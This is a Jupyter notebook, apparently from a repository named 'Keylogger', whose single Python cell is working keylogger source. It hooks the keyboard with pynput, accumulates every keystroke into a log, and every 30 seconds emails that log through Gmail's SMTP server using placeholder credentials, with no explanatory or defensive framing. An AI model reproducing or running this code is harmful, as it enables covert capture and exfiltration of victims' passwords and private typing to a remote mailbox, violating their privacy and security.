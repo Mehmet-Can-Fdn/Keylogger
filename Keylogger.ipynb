{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput.keyboard\n",
    "import smtplib\n",
    "import threading\n",
    "\n",
    "\n",
    "log = \"\"\n",
    "def callback_function(key):\n",
    "    global log\n",
    "    try:\n",
    "        log = log + str(key.char)\n",
    "\n",
    "    except AttributeError:\n",
    "        if key == key.space:\n",
    "            log = log + \" \"\n",
    "        else:\n",
    "            log = log + str(key)\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "    print(log)\n",
    "\n",
    "def send_email(email, password, message):\n",
    "    email_server = smtplib.SMTP(\"smtp.gmail.com\",587)\n",
    "    email_server.starttls()\n",
    "    email_server.login(email,password)\n",
    "    email_server.sendmail(email,email,message)\n",
    "    email_server.quit()\n",
    "\n",
    "keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)\n",
    "\n",
    "def thread_function():\n",
    "    global log\n",
    "    send_email(\"user@gmail.com\", \"password\", log.encode('utf-8'))\n",
    "    log = \"\"\n",
    "    timer_object = threading.Timer(30,thread_function)\n",
    "    timer_object.start()\n",
    "\n",
    "with keylogger_listener:\n",
    "    thread_function()\n",
    "    keylogger_listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
